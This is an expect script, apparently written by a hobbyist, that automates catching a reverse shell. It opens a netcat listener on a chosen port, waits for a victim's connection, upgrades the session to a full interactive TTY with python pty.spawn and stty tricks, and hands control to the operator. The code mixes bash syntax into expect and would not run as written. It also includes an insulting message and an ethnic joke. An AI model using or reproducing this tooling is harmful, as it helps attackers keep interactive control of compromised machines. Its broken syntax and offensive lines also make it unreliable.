#!/usr/bin/expect

lassign $argv arg1 arg2 arg3

log_user 0
set timeout -1

spawn /bin/bash

if [ $arg1 -lt 1024]; then
    if [ $UID -ne 0 ]; then
        echo "Be sudo morron."
        exit 100
    fi
fi

send "nc -lvp $arg1\n"

snakeMissing=0
send "which python"
if [ $? -ge 1 ]; then
    echo "missing snake"
    snakeMissing=1
fi
send "which python2"
if [ $? -ge 1 ]; then
    echo "missing 2 snakes"
    snakeMissing=1
fi
send "which python3"
if [ $? -ge 1 ]; then
    echo "missing 3 snakes"
    snakeMissing=1
fi

if [ snakeMissing -gt 0 ]; then
    echo "Please, call indian center to generate snakes"
    exit 1
fi

expect "Connection from"
send "python -c \'import pty; pty.spawn(\"/bin/bash\")\'\n"
sleep 2
send \x1A
send "stty raw -echo\n"
send "fg\n"
send "export TERM=xterm-256color\n"
send "export SHELL=bash\n"
send "stty rows `tput lines` columns `tput cols`\n"
send "reset\n"
interact
send "stty -raw echo\n"
send "exit\n"
exit
